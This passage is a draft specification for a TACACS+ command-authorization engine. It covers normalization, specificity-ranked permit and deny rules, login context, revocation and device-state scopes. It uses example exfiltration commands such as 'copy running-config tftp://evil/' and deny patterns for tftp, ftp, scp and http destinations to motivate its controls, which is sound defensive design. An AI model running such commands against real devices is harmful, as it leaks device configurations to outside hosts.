# port49 — Policy Engine Specification

**Status:** Draft
**Date:** 2026-08-23
**Companion to:** [`2026-08-21-port49-design.md`](2026-08-21-port49-design.md)

This document specifies the authorization engine: how a TACACS+ request becomes a
decision. The design document covers architecture and rationale; this one is meant to be
implementable.

Configuration keys are `snake_case` throughout.

---

## 1. Scope

The engine answers three questions, at three different moments:

| Point | Question | Component |
|---|---|---|
| **Mint** | May this principal reach this device at all? | broker |
| **Session** | What shell profile does this login get? | daemon |
| **Command** | May this command run here, now? | daemon |

The middle one is easily overlooked and must not be. The session point is the `service=shell`
authorization with an empty `cmd`, which returns `priv-lvl`, `shell:roles`,
`local-user-name`, `idletime`, and friends — and it is where a large share of real-world
TACACS+ deployments do *all* of their authorization, because platforms such as Junos have no
meaningful per-command path. It maps directly onto `aaa authorization exec` in device
configuration, as the other two map onto `aaa authorization commands` and
`config-commands`.

---

## 2. Concept model

The full taxonomy — every authored, imported, and runtime object, what creates each, and how
they compose — lives in the design document, §6. This section covers only the distinctions
that need argument rather than definition.

**Device is a fact; Scope is a selector.** Inventory is imported and describes reality.
Scopes are authored and describe intent. Keeping them separate is what makes
`match: {site: us_west}` mean something.

**Principal is runtime; Subject is policy.** A principal is `CN=alice,OU=netops,O=example`
or `system:serviceaccount:netops:oxidized`. A subject is how policy addresses a set of
them, and it has exactly two forms — an LDAP group, or one or more literal identities. That
single mechanism covers both directory-driven human access and hand-maintained service
accounts.

**A subject MAY list several identities.** Matching already resolves a set — an LDAP group
yields many principals — so accepting a list costs nothing and makes credential migration a
non-event:

```yaml
subjects:
  - name: svc_oxidized
    identity:
      - "spiffe://port49/host/oxidized-01"        # VM, workload certificate
      - "system:serviceaccount:netops:oxidized"   # Kubernetes, once migrated
    enable: token
    token_ttl: 900s
```

Both resolve to the same subject and therefore the same grants. An operator adds the second
identity, cuts over, and removes the first — with no window in which the workload is denied
and no policy change during the migration. It also covers a workload that legitimately runs
in two places at once.

Identities from different trust domains MUST remain distinguishable (§7 of the design
document): listing a human and a machine identity under one subject is a policy load error,
not a convenience. For CI to enforce that, an identity string carries its domain in its form —
`user:alice@example.com`, `spiffe://…`, `system:serviceaccount:…`, `app:<client_id>` — and a
string in no recognized form is itself a load error. At runtime the domain is never read from
the string; it is whichever verifier validated the credential (design document §7).

**Each verifier produces the principal string, prefix included**, so the runtime string and
the policy string are the same string and the subject matcher is a comparison:

| Verifier | Principal string |
|---|---|
| human x509 | `user:` + the directory attribute the certificate maps to (design document §7) |
| human OIDC | `user:` + `preferred_username` (or `email` where the deployment says so) |
| workload x509 | the SAN URI verbatim — `spiffe://…` |
| Kubernetes | `system:serviceaccount:<namespace>:<name>` from the token's `sub` |
| machine OIDC | `app:` + the token's `client_id` (`azp`) |

Every example in this document that shows a principal shows the prefixed form. §5.1.4's
`credential.method` takes `cert`, `oidc`, or `k8s`, matching the verifier types.

**What a subject may do through the broker API.** The API (design document §17) authorizes
the caller as a principal and, by default, lets a principal act only on its own tokens and
contexts: mint for itself, revoke its own, explain its own hypothetical decisions. Acting on
someone else is a right the subject declares:

```yaml
subjects:
  - name: netops_oncall
    group: NetOps-OnCall
    api: [revoke_others, explain_others]
  - name: ci_policy_bot
    identity: ["app:port49-ci"]
    api: [sync, replay]
```

| Right | Unlocks |
|---|---|
| `revoke_others` | `/v1/tokens/revoke` by another principal or `sid` |
| `explain_others` | `/v1/explain` for a principal other than the caller |
| `sync` | triggering an inventory sync |
| `keys_show` | rendering a device key's secret (§12) |
| `replay` | reading the decision log through the API |

`/v1/logout` needs no right, since it authenticates by the identity provider's signature on
the logout token rather than by a caller. CI reports every subject carrying an `api:` list,
because it is a grant of authority over other people's sessions and reads like one.

### The device-facing username

A principal is not what anyone types at a login prompt. `CN=alice,OU=netops,O=example` is
the identity; `alice` is the username the device sends. The two are distinct strings and
both are load-bearing — the token store is keyed `(nas, username)`, username binding is a
MUST (design document §8), and accounting attributes to the principal behind it. The mapping
between them therefore has to be explicit.

**For human identities it is already resolved at mint**, by the same directory lookup that
fetches groups. No additional query:

| Identity path | Username source |
|---|---|
| LDAP or AD | `sAMAccountName` / `uid`, from the group-resolution query |
| OIDC | the `preferred_username` claim |
| certificate | via the certificate-to-directory mapping (§7 of the design document) |

**Machine identities have no directory entry**, so the subject declares one:

```yaml
subjects:
  - name: svc_oxidized
    identity: ["system:serviceaccount:netops:oxidized"]
    username: svc-config-backup        # what the device will present
```

**Usernames MUST be unique across subjects, and CI can only check half of it.** Declared
machine usernames are checked against each other at load. Human usernames come from the
directory at mint, so a machine subject declaring `username: alice` collides with a human
`alice` only at runtime; the broker checks at mint and refuses the *later* claimant with a
reason naming both. Two subjects claiming one username collide in
the `(nas, username)` store key and make the audit trail ambiguous; this is a policy load
error. Collision with a device-local account name is the same hazard described in §5.6 and
SHOULD be reported where port49 can observe it.

**The username is canonicalized before it is used as a key, not merely compared.** The
device sends whatever the operator typed — `alice`, `DOMAIN\alice`, or
`alice@corp.example.com`. The broker writes the token under the canonical form — lower-cased,
domain prefix and UPN suffix stripped — and the daemon canonicalizes the wire username the
same way before every store access and every binding check. Without this, a user who types
their address rather than their shortname is denied at redemption with `token_not_found` and
no obvious cause.

**Privilege decides what the device will offer; the role decides what port49 will permit
within it.** The two are not independent axes — the effective permission set is the
intersection, and the role is always a subset. A backup account needs `admin` privilege so
`show running-config` is *reachable*, while command rules confine it to `show`. Set the
level too low and permitting rules become dead letters, because the device never submits
those commands. See §6.

---

### Terminology

The complete taxonomy — every authored, imported, and runtime object, and how they compose —
is in the design document, §6. It is maintained there rather than duplicated here so the two
cannot drift.

Four overloads are worth restating, because they are the ones that mislead implementers:

**`session` versus `session authorization`.** The first is the operator's 8–16 hour
authenticated state, held by the agent. The second is a TACACS+ exchange at login —
`service=shell` with an empty `cmd` — which returns the shell profile. They are unrelated
despite the shared word, and the protocol term is fixed by RFC 8907.

**`login context` is per *login*, not per session.** One operator session produces many
logins, each with its own context keyed `(nas, username)`. Two concurrent logins by the
*same* operator to the *same* device therefore share one context; that is the accepted cost
of the key and is stated plainly in §5.6.

**`token` versus `presented credential`.** The token is what port49 mints. The presented
credential is what arrives in the authentication packet — the token verbatim for PAP and
ASCII, but `ppp_id ‖ challenge ‖ response` for CHAP, which proves possession without
carrying it. The distinction is what lets one receipt rule (§5.6) cover all three types.

**`token` versus `handle`.** The same thing. *Handle* survives only where the design document
contrasts an opaque handle with a signed token; new text says token.

---

## 3. Request normalization

The matcher never sees raw wire data. A platform adapter converts an authorization request
into a canonical form:

```
principal      resolved from login context, not from the wire
device         resolved from source address via inventory
service        shell | <other>
privilege      priv_lvl from the request header
command        [cmd, arg1, arg2, ...]     as received; <cr> stripped; compared case-insensitively
pipeline       [[stage_cmd, arg, ...], ...]   split at the platform's pipe token
```

### Why normalization is its own layer

A command authorization request arrives tokenized, not as a string:

```
cmd=show  cmd-arg=running-config  cmd-arg=|  cmd-arg=redirect
cmd-arg=ftp://10.9.9.9/cfg  cmd-arg=<cr>
```

Reconstructing that into `"show running-config | redirect ftp://10.9.9.9/cfg"` and matching
a regex against it is the traditional approach and it is lossy: the `=` versus `*` flag is
discarded, embedded whitespace becomes indistinguishable from argument boundaries, and two
different requests can produce the same string. Matching the vector directly avoids the
entire class.

### Normalization rules

1. **Strip the trailing `<cr>`** where the platform sends one.
2. **Split at the pipe token** into a command and zero or more pipeline stages.
3. **Comparison is case-insensitive; the vector is not altered.** Device CLIs accept
   mixed-case keywords, so a case-sensitive match is bypassable with `SHOW run`. Literal
   terms and entity-class patterns therefore compare case-insensitively, and regex terms
   compile case-insensitive **by default**, with `(?-i)` available to opt into exactness
   where a device object really is case-sensitive (IOS ACL names, for instance).

   Insensitive must be the default because a case-sensitive deny fails *open*: a rule
   reading `deny: interface /^Management/` would otherwise be evaded by typing
   `interface management1`.

   The vector itself is left as received, so accounting records what the operator actually
   typed.
4. **Expand abbreviations** where `expands_abbreviations: false`. If a platform sends what
   the operator typed rather than the resolved command, `sh run` must be expanded to
   `show running-config` before matching, or `show **` is bypassable. Where port49 cannot
   expand reliably, the platform MUST be marked as such and the daemon MUST fail closed
   rather than match a possibly-abbreviated vector.
5. **Preserve argument boundaries.** Arguments are never re-joined.

---

## 4. Matching

### Grammar

A rule is a whitespace-separated sequence of terms, matched against the canonical command
vector.

| Term | Matches | Specificity |
|---|---|---|
| `word` | exactly that argument, case-insensitively | 3 (most specific) |
| `@class` | one argument in a platform-defined entity class (§8) | 2 |
| `/re/` | one argument matching the RE2 expression | 2 |
| `*` | exactly one argument, any value | 1 |
| `**` | zero or more arguments — **trailing position only** | 0 (least specific) |

**`@class` and `/re/` share a rank deliberately.** Neither is reliably narrower than the
other: a regex may name exactly one interface while a class holds forty-eight, or the
reverse. Ranking one above the other would be an invented ordering that is wrong half the
time, and it would let `interface @physical` silently beat
`interface /^Ethernet1$/`. Equal rank means neither dominates the other at that position, so
the conflict resolves conservatively (§5.4).

A corollary: `/^.*$/` is semantically identical to `*` but would rank higher, so CI SHOULD
flag a regex that is equivalent to `*` or to a literal and require the simpler spelling.
This is a lint concern rather than a soundness one, but an unlinted policy would let a rule
buy specificity by how it is written rather than by what it constrains.

```yaml
permit:
  - show **                          # show, and anything after it
  - show bgp summary                 # exactly that, nothing more
  - clear counters *                 # one argument
  - interface @physical              # platform-defined class
  - interface /^(ethernet|port-channel)[0-9/.]+$/
```

**Rules match the full vector.** There is no implicit prefix match — `show bgp summary`
does not match `show bgp summary detail` unless the rule ends in `**`. This is the
property that makes the engine safe by default and is the main practical difference from
unanchored regex.

**`**` is trailing-only** so matching stays linear. Mid-pattern wildcards would be needed
to express things like `show ** | redirect **`; splitting the pipeline out during
normalization removes that need entirely, which is why the split belongs in the adapter
rather than in the grammar.

**Regex is confined to a single argument.** RE2 (Go's `regexp`) has no catastrophic
backtracking, and a leaf regex can never span argument boundaries, so its blast radius is
one position. Regex terms are also the only construct that degrades the effective-permission
diff (§12), which is a reason to prefer literals, `@class`, and `*` where any will do.

**Entity classes solve cross-platform naming.** A rule reading
`deny: interface /^(management|mgmt)/` works on EOS and NX-OS and silently does nothing on
Junos, where the interface is `fxp0` — no error, no warning, the deny simply never matches.
Writing `deny: interface @management` instead delegates the spelling to the platform
adapter, which classifies rather than canonicalizes. We never need to know that `ge-0/0/1`
and `Ethernet1/1` are the same kind of thing; we only need each platform to say which of
its names are management interfaces. A rule referencing a class the platform does not
define is a **policy load error**, which makes the silent-no-match failure impossible.

### Pipeline stages

Output modifiers are matched separately and are **allow-listed, not deny-listed**. A
blocklist fails open on the next vendor extension; an allowlist does not.

Every role inherits a shipped default allowlist unless it declares its own:

```yaml
pipe:
  permit: [include **, exclude **, begin **, section **, json, count, no-more]
```

This matters because `show running-config | redirect ftp://…` is an exfiltration primitive
and `| append` is a write primitive, both wearing a read-only command's clothes. A role
whose only rule is `show **` permits both unless pipeline stages are evaluated.

Each stage of a chain is evaluated independently:
`show run | section bgp | include neighbor` is two stages, both checked.

**Platform caveat.** Some devices apply output modifiers locally *after* authorizing the
base command, so the pipeline never reaches port49. Those platforms MUST set
`pipe_authorized: false`, and port49 MUST NOT imply a protection it cannot deliver — the
control moves onto the device (disabling `copy`, `redirect`, file privileges). `port49
explain` MUST say so when asked about a pipeline rule on such a platform.

---

## 5. Evaluation

### 5.1 Mint (broker)

```
principal
  → subjects            match by LDAP group membership or any listed identity
  → grants              those whose subject matches AND whose scope matches this device
                        AND whose `expires` has not passed
  → roles               union across matching grants
  → privilege           max over granted roles (no grant-level override)
  → max_privilege       max over matching grants; absent means no escalation
  → effective rules     resolved permit/deny/pipe sets
  → av_pairs            rendered for this device's platform
```

Failure to match any grant means the device is unreachable for that principal, and the mint
fails **before an SSH connection is opened**.

### 5.1.1 Where the resolved policy waits

The broker computes this result, but the daemon needs it. Login context is keyed on
`(nas, username)` — the same key the token already lives under — so the key *is* knowable at
mint. **The broker nonetheless does not write login context**, for reasons that are design
choices rather than facts about the protocol: the context records what happened at
redemption (`ctx_id`, `auth_time`, the `port` and `rem_addr` the device actually presented),
and only the daemon is there when it happens.

This paragraph used to say the key was unknowable at mint, because the key was `(nas, port)`
and the port does not exist until the device opens the authentication exchange. That stopped
being true on 2026-09-20 (§13, decision 15).

The resolved result is instead stored as an immutable, **content-addressed policy blob**,
referenced by the token:

```
blob:<sha256>            the fully compiled decision — see 5.1.2
token:(nas, username)    { handle, kind, blob_hash, principal, username,
                           max_session_age, reusable, expires, ... }
```

`max_session_age` rides in the token record because the daemon computes `session_expires`
at redemption and the blob is shared across principals; where a principal holds several roles
the broker writes the **minimum** over them.

On successful redemption the daemon creates login context, which holds **the hash rather
than a copy**:

```
ctx:(nas, username)
  ctx_id            01J9F3QK…            assigned at creation; correlates every record
  principal         user:alice@example.com
  username          alice                in the key; also recorded here
  port              ssh                  recorded as the device presented it at
                                         authentication; part of no key (§13, decision 15)
  rem_addr          198.51.100.4         recorded; compared on enable
  privilege         15
  blob_hash         sha256:a3f9c1…
  credential        see 5.1.4
  auth_time         1757041495           when the human actually authenticated
  session_expires   1757070295           auth_time + max_session_age
  refreshed_at      1757041495           last broker refresh (5.1.3); the staleness clock
  revoked_at        —                    set by revocation (5.6); denies until idle TTL reclaims
  task_id           42                   from exec accounting, once observed (5.8)
  accounting_state  open | closing       advisory (5.8); never authorizes or denies
```

`refreshed_at` is written at creation and on every refresh. When `now - refreshed_at`
exceeds the configured `staleness_ceiling` (design document §9 and §12) the daemon denies
with `context_stale`, which is how "serve stale up to a ceiling, then fail closed" reaches
the command path.

`ctx_id` is assigned once, at creation, and never changes. It is the join key between the two
record streams: every decision (§5.7) and every resolvable accounting record (§5.8) carries
it, which is what makes a single identifier reach from an OIDC login to a typed command.

**Why content-addressed.** A batch mint resolves to the same value for every device in one
scope — what varies is the rendered attributes, and those vary by *platform*, not by device.
A sweep across 10,000 devices spanning four platforms therefore produces **four** blobs, not
ten thousand. The blob is written once and referenced by every token that resolves to it.

**Why the context holds a hash.** Blobs are immutable, so each daemon replica caches them by
hash indefinitely with no invalidation problem. Per-command authorization is then one small
context read plus a local cache hit, rather than two store round trips — which is what keeps
the p99 target reachable.

**Lifetime.** A blob has two consumers with different needs, and each is served separately.
Live contexts reference a blob for the life of the login — hours, or `never` — so a blob's
store TTL is bumped at every redemption and refresh to the referencing context's remaining
lifetime; a blob referenced by nothing expires on its own once the last token that named it
has. No reference counting is required. Replay (§5.7) needs the blob for as long as records
name it, which is the audit retention period, so **the blob is emitted once into the decision
log as a `blob` event when it is first written**; replay reads the log and owes the store
nothing. On the command path `blob_unavailable` is therefore a store fault, not a verdict: the
daemon serves its cached copy and alarms.

**Cost.** One additional store read at redemption, on the *login* path. The p99 < 5ms target
governs per-command authorization, which is unaffected.

### 5.1.2 The blob is fully compiled

Evaluating a command requires platform knowledge: normalization needs the pipe token, the
`<cr>` convention, and the abbreviation flag, while matching needs the actual regexes behind
each `@class`. The design document's claim that the daemon "never learns what a platform is"
therefore cannot hold for command authorization as literally as it does for attributes.

It is resolved by **compiling the platform into the blob** rather than shipping platform
definitions to the daemon. The broker already knows the device's platform at mint, so it
expands entity classes and embeds the normalization parameters:

```yaml
blob:a3f9c1…
  rules:
    permit: [[show, **], [interface, /^Ethernet[0-9/]+$/]]
    deny:   [[reload, **], [interface, /^mgmt[0-9]+$/]]     # @management, expanded
    pipe:   [[include, **], [section, **], [json]]
  normalize:
    pipe_token:            "|"
    strip_cr:              true
    expands_abbreviations: true
  enable_username:  "$enab{level}$"
  privilege:        operator
  max_privilege:    admin
  attributes:       ['shell:roles*"network-operator"']
```

The daemon becomes a pure executor: it normalizes with the given parameters and matches
against compiled rules. It never reads a platform file, never resolves a class, never decides
whether to strip a terminator.

**The governing distinction:**

> The inventory bundle (§10) carries **facts**. The blob carries **decisions**.

The daemon needs facts to accept a connection — which device this source address is, which
shared key to use. It needs a decision to authorize a command. Dialect data is used only
while evaluating a decision, so it travels with the decision.

**Why not distribute platform definitions to the daemon.** A shared bundle version would make
that safe in principle, but it has to actually be shared: a replica that has not refreshed, a
rolling upgrade in flight, or a pod started before the bundle rotated all reintroduce skew.
A hash-named blob is self-describing — whatever compiled it is what evaluates it, permanently
— so the failure cannot occur rather than merely being unlikely. It is also far easier to
debug: one blob dump shows exactly what was evaluated, with no need to recover which platform
version a daemon held at the time.

**Cost.** Blobs grow from a few hundred bytes to a few kilobytes. Because they are
content-addressed, deduplication is per policy-version and platform rather than per token, so
a 10,000-device fleet across four platforms yields a few dozen blobs.

**One escape hatch.** If a platform is found to require genuine abbreviation expansion, its
command vocabulary is too large to embed per blob; that table alone would ride in the
inventory bundle while everything else stays compiled. Most platforms expand server-side and
§3 already fails closed where expansion is unreliable, so this is recorded rather than
designed for.

### 5.1.3 Refreshing live context

The broker refreshes login context while a login remains active (design document §9), which
requires it to discover which contexts exist. Nothing in the store makes that discoverable by
itself, and scanning the keyspace is both store-specific and expensive at scale.

The daemon MUST therefore maintain an index as it creates and tears down context:

```
contexts_by_principal:(principal)   → set of (nas, username)
active_principals                   → set of principal, entries expiring with their last context
```

`active_principals` exists because the scheduled refresh must enumerate principals with live
contexts, and an index keyed by principal cannot be listed without a keyspace scan.

Refresh then means: the broker re-resolves for a principal whose group membership has
changed, writes a new blob if the result differs, and updates `blob_hash` in each of that
principal's live contexts. Contexts are small, so the update is cheap, and because blobs are
immutable a replica's cached copy of the old blob is never wrong — it is simply no longer
referenced.

This also makes **policy-driven revocation reach active sessions**, not only directory-driven
revocation. A policy change that removes a grant produces a different blob, and live contexts
pick it up on the next refresh.

### 5.1.4 Credential identity and revocation

Login context records which credential authorized it. Not to re-verify — **the daemon never
sees the credential.** The certificate or OIDC assertion is presented to the *broker* at mint;
the command exchange carries only `user`, `port`, `rem_addr`, and `priv_lvl`. A fingerprint
therefore cannot tighten per-command comparison, because the device has nothing to compare it
against.

What it buys instead is revocation that reaches a live device session, and attribution that
survives in the log. The test applied to each field is narrow: **does it enable an action
otherwise impossible?**

```
credential:
  method       cert | oidc | k8s     the verifier type that validated it (§2)

  # cert
  fingerprint  sha256:4c1e…        what an operator or tool actually pastes
  issuer       CN=Corp Issuing CA  }  a CRL or OCSP response names exactly
  serial       0x3f9a01…           }  these two
  subject      CN=alice,OU=…

  # oidc
  iss          https://sso.example.com
  sub          a7f3-…              revokes every session of a principal
  sid          9c2b-…              back-channel logout names this
  amr          ["pwd", "mfa"]      recorded, not yet acted upon
  acr          urn:…:loa2
```

**`sid` is the most valuable field here.** OIDC back-channel logout delivers a logout token
naming `sid` (or `sub`), so an SSO logout — a stolen laptop, an offboarding — reaches the
operator's live router sessions. Without it, that is not merely slow; it is impossible.

**`amr` and `acr` are recorded because they are unrecoverable later.** Nothing can establish
afterward how someone authenticated. They are not consulted by v1 evaluation; a role that
requires MFA is a natural extension and would be unimplementable retroactively without them.

**Certificate `notAfter` and the OIDC `exp` are deliberately absent.** They bound the *mint* —
the credential MUST be valid when the broker resolves it — and not the session. An ID token's
`exp` is commonly minutes, and treating it as a session ceiling would end a router session
every hour for no security gain. Session lifetime is port49 policy, held in
`session_expires` and derived from `auth_time` (§5.6).

**Consequence for the store.** Context now holds identity material — subject DNs, `sub`
claims, an operator's name. None of it is a credential, but it is PII-adjacent, so **login
context MUST receive the same encryption-at-rest treatment as tokens** (design document §8).
That obligation previously covered tokens alone.

### 5.2 Session authorization (daemon)

On a session authorization — an empty `cmd`, carrying the platform's own session `service` —
the daemon returns the session attributes from the
blob the context names, with `{username}`, `{principal}`, and `{device}` substituted from the
context (§6). The blob is one per platform and shared across principals, so substitution
happens here, in the daemon, at each session authorization — never at mint. No platform
knowledge, one context read, one cached blob.

**Which `service` values a platform's sessions arrive with is a platform fact, not a
constant.** EOS, NX-OS and IOS-XE all send `service=shell`; Junos sends `service=junos-exec`,
and renames it per device with `set system tacplus-options service-name <name>` — SRX fleets
running `junos-exec-fw` are real. The adapter therefore declares `session_services`, a list
(§8), defaulting to `[shell]` for the Cisco and Arista platforms and `[junos-exec]` for
`juniper_junos`, and an operator may set the list for a platform they have renamed it on. A
request whose `service` is on no entry of that list is denied `service_unsupported` (§5.3).
Measured: §15, L10.

> **The `service` value never selects policy.** It is an envelope the device puts its
> question in, and port49 answers it or refuses it. *Which* grants, roles and rules apply is
> decided by scope membership — which devices the inventory places a principal's grants over
> (§5.5, §10) — and by nothing on the wire. A device that renames its service to
> `junos-exec-fw` does not thereby select a different policy, get a different privilege, or
> reach a rule it could not reach as `junos-exec`. The name is recorded on the decision
> record (`request.service`, §5.7) so a reader can see what was asked; it is an input to one
> comparison and to no other.

If login context is absent, the daemon fails closed and logs a distinct reason —
`context_missing` is operationally very different from `no_rule_matched` and the two must
never share a log line.

### 5.3 Command authorization (daemon)

```
normalize(request)
  → if no login context                → DENY (context_missing)
  → if username ≠ ctx.username         → DENY (username_mismatch); invalidate (§5.6)
  → if ctx.revoked_at set              → DENY (credential_revoked)
  → if now > ctx.session_expires       → DENY (session_expired)
  → if now - ctx.refreshed_at
       > staleness_ceiling             → DENY (context_stale)
  → if request level > ctx.privilege   → DENY (privilege_exceeded)
  → collect every matching rule, permit and deny alike
  → if no permit matches                 → DENY (no_rule_matched)
  → if no permit dominates every
    matching deny (§5.4)                 → DENY (no_permit_dominates_deny; rule, role)
  → for each pipeline stage:
        if stage matches no pipe permit  → DENY (pipe_stage_denied; stage)
  → PERMIT (permit_dominates; rule, role)
```

Default is deny. Every decision carries the rule and role that produced it, which is what
makes `explain` able to name exactly one reason.

A request whose `service` is not on the device's platform `session_services` list (§5.2, §8)
is denied `service_unsupported` before any rule is consulted. The list is per platform, with
built-in defaults and an operator override; a platform port49 ships no adapter for falls back
to `[shell]`, which is what §8 "Unknown platforms" requires — a missing dialect file must not
take down a login.

**A denial tells the person who typed the command why.** The REPLY carries `server_msg` —
`port49: denied by no-exfil (* * /^tftp:/) — see 'port49 explain'` — so the operator at the
CLI has the reason and the instrument without a ticket. It names the rule that decided, which
the operator has just exercised, and nothing about rules they have not; operational reasons
(`context_missing`, `session_expired`) say what to do next rather than what went wrong inside.
Whether the device displays it is lab register entry L2.

### 5.4 Composition across roles

> **Permit if some permit rule dominates every matching deny. Otherwise deny.**

There is exactly one deny mechanism. Permits and denies from every granted role are
collected into one set and resolved by specificity — but specificity is a **partial** order,
not a total one, and that is the point.

**Specificity tuples.** A rule matching an N-argument command produces an N-element tuple:
one slot per argument of the *command*, not per term of the rule, each holding the rank
(§4) of whatever term covered it. A trailing `**` contributes a `0` for every position it
absorbs.

```
command:    show     chassis    hardware
            ────     ───────    ────────
rule A:     show     chassis    hardware
                3          3           3      →  (3, 3, 3)
rule B:     show     chassis    **
                3          3           0      →  (3, 3, 0)
rule C:     show     **
                3          0           0      →  (3, 0, 0)
```

**Dominance.** Rule X dominates rule Y when X is greater than or equal to Y at *every*
position and strictly greater at *at least one*. This is all-or-nothing: losing a single
position is enough to fail, no matter how many others are won.

```
copy running-config tftp://evil/

permit copy **                     (3, 0, 0)
deny   * * /^(tftp|ftp|scp|http):/ (1, 1, 2)

does the permit dominate?   requires ≥ at EVERY position
  pos 1:  3 ≥ 1   ✓
  pos 2:  0 ≥ 1   ✗   ← fails here
→ no                                          result: DENY
```

The two rules disagree about which position matters — the permit named the command, the
deny named the destination — so no dominance relation exists and the deny stands.

**The test is one-sided.** A deny never has to dominate anything; it is the default and wins
by not being beaten. Only the permit must prove itself. That asymmetry is the safety
property: an exception is admitted only when it is unambiguously narrower, never merely
narrower in the places its author happened to care about.

```
show chassis hardware

permit show chassis hardware  (3, 3, 3)
deny   show chassis **        (3, 3, 0)
  pos 1: 3 ≥ 3 ✓   pos 2: 3 ≥ 3 ✓   pos 3: 3 ≥ 0 ✓, strictly greater
→ dominates                                   result: PERMIT
```

**The practical rule for authors:** an exception must be at least as precise as the rule it
excepts, at every position that rule constrained. Naming `copy running-config` does not buy
back an unrestricted destination — the destination must be named too:

```
permit copy running-config @backup_targets   (3, 3, 2)   → dominates, PERMIT
permit copy running-config *                 (3, 3, 1)   → pos 3 fails, DENY
```

**Why not a single score.** Lexicographic comparison, a sum of ranks, and a run-collapsed
distance metric were each evaluated and each fails on real policies, in different places.
Any scheme reducing the tuple to one comparable number *must* produce an answer even when
the rules genuinely disagree about which position matters — so some case always resolves
against intent. Under lexicographic ordering, for instance, a permit naming the first word
beats any deny constraining a later argument, defeating exfiltration and disruptive-form
denies outright. The vulnerability is in the collapsing, not the arithmetic. A partial order
that declines to rank incomparable rules is the only formulation that stays conservative in
every case.

**Ties and explain.** Where several rules of the same verdict match and `explain` must name
one, the tie is broken by lexicographic comparison of the tuples, then by declaration order.
This is presentation only and cannot change a decision.

Specificity is a property of the rule and the command, never of position in a file, so
**evaluation is order-independent**: reordering roles, grants, or rules within a role cannot
change any decision. Formatters, merge conflicts, and role refactors are provably safe.

Because rules insert into a trie and the result is a total function over command space, the
**effective-permission diff stays exact** — old versus new is a computable difference, not a
sample of whatever commands a test corpus happened to contain.

**Why not deny-overrides.** A global deny-wins rule is simpler to state, but it cannot
express an exception. Once `show chassis **` is denied — say, in response to a CVE — the
only remedy is to narrow the deny itself, which requires negation: *deny `show chassis`
anything except `hardware`*. The leaf regex is RE2, which has **no lookahead**, so
`/^(?!hardware$)/` does not compile, and the alternative is enumerating every subcommand
positively and being wrong the next time the vendor adds one. Deny-overrides therefore
needs an exception mechanism bolted on regardless; most-specific supplies one in the grammar
already present. This is not hypothetical — a broad `show chassis *` deny added for a CVE
breaking a backup account's `show chassis hardware` is the motivating case.

**What is given up, and what replaces it.** Under deny-overrides a deny is a guarantee.
Under most-specific it is a default that a more specific permit can override. The
replacement is not a second construct but **visibility**: CI MUST report every shadowed
deny, naming the rule, the subject, and the permit that beats it.

```
⚠ SHADOWED — this deny will NOT apply:
    svc_oxidized  permits "show chassis hardware"        (more specific)
    security_ir   permits "show chassis cluster status"  (more specific)
```

You learn the deny is incomplete when you write it, not when a backup run fails.

**Deliberate exemptions use the same mechanism.** A narrower permit is how an exception is
expressed, so incident response reaching one command under a broad prohibition needs no new
concept:

```yaml
roles:
  - name: cve_2026_xxxx
    reason: "CVE-2026-XXXX — SRX cluster subsystem"
    deny:  [show chassis cluster **]

  - name: cve_2026_xxxx_assess
    reason: "CVE-2026-XXXX — IR needs cluster state to assess exposure"
    permit: [show chassis cluster status]
```

**Two consequences for CI.** A deny may be inert if shadowed, so *"adding a deny is always
safe"* no longer holds; and a permit may override a deny, so *"only permit growth widens
access"* becomes the check that matters. Both are computable from the trie, and the gate is
stated directly: **this change makes command C permitted where it was denied.**

### 5.5 Scoping policy to device state

Scopes match device attributes (§10), and those attributes change. A scope keyed on a
*changing* fact makes the population it selects shrink as reality changes, which turns
mitigation into something that lapses on its own:

```yaml
scopes:
  - name: srx_unpatched
    match:
      platform: juniper_junos
      os_version: {lt: "21.4R3-S5"}
    on_missing: include        # no version data → assume vulnerable
    security_log: true         # membership changes log as security events
    attached_roles:
      humans:   [cve_2026_xxxx]
      machines: [cve_2026_xxxx]
```

`attached_roles` is not a special deny path — the same role machinery, composed into every
grant that lands on the scope — which is why there is still only one place to deny a command.

#### Roles attach to scopes; there is no subject that means everyone

Earlier drafts had universal subjects — `all_humans`, `all_machines`, `all_principals` —
usable in a grant like any declared subject. They were removed because the word cannot be
made to mean what it has to mean. Under OIDC "all humans" is the whole identity provider,
every employee, so the range had to be narrowed to "principals who already have access", and
then a reader of `{subject: all_humans, …}` sees *everyone* and is wrong. A subject-shaped
form invites its own overuse.

The thing actually being described is not a set of people. It is *every grant that reaches
these devices also carries these roles*. So it is declared on the scope:

```yaml
scopes:
  - name: all_devices
    attached_roles:
      humans:   [baseline_show]
      machines: [baseline_show]
  - name: dc_fabric
    match: {site: dc1}
    attached_roles:
      humans: [dc_safety_denies]
```

**Evaluation.** At mint the broker finds the grants whose declared subject matches the
principal and whose scope selects the device. If there are none, the mint is refused with
`no_grants_matched` — attached roles have nothing to attach to. Otherwise, for every scope
that selects the device, the `attached_roles` for the principal's trust domain compose into
the grant under §5.4, exactly as if they had been listed on it.

| Principal | Declared grant selects the device? | Result |
|---|---|---|
| Alice, `noc_tier1` on `dc_fabric` | `dc-leaf-1` — yes | `dc_operator` + `baseline_show` + `dc_safety_denies` |
| Alice | `campus-sw-7` — no | refused; attached roles do not create access |
| offboarded `svc_oxidized`, grants removed, subject block still present | any — no | refused |
| Carol, Finance, valid SSO, no subject | any — no | refused |

Three consequences worth stating. Attached roles **add commands to devices a principal
already reaches and never add a device**; a fleet-wide baseline for a team is a declared
grant on `all_devices`, in the grants list where access review looks. The trust-domain split
of design document §7 is kept by the `humans:` / `machines:` keys, and a scope may attach to
one, both, or neither. And offboarding is `port49 grants remove --subject` (§12), after
which a lingering subject block is inert.

CI MUST report every scope carrying `attached_roles` whose roles carry a permit, since a
fleet-wide deny is routine and a fleet-wide permit rarely is; `all_devices` remains an
ordinary scope name.

Three properties make this materially better than a curated device list:

- **Coverage includes devices that do not exist yet.** A device racked after the CVE lands
  is covered the moment it appears in inventory. Hand-maintained lists cannot do this.
- **Mitigation lifts per device as it is remediated**, so partial upgrades behave correctly
  and no coordinated removal step is required.
- **Scope size is the remediation burndown**, queryable rather than tracked in a spreadsheet.

The same shape covers other lifecycle states: `{tag: change_freeze}` to deny configuration
during a freeze, `{status: staged}` to restrict pre-production devices, `{status:
decommissioning}` for read-only on the way out.

**Two requirements this places on the implementation.**

`on_missing` MUST be explicit where an attribute is optional, and the safe direction differs
by rule type: for a deny-bearing scope, a missing attribute means *include* (assume
vulnerable); for a permit-bearing scope it means *exclude*. A broken inventory sync silently
lifting a mitigation is the failure to design against.

`security_log: true` marks a scope whose membership changes are security events. This is
required because a scope keyed on device state makes **source-of-truth write access
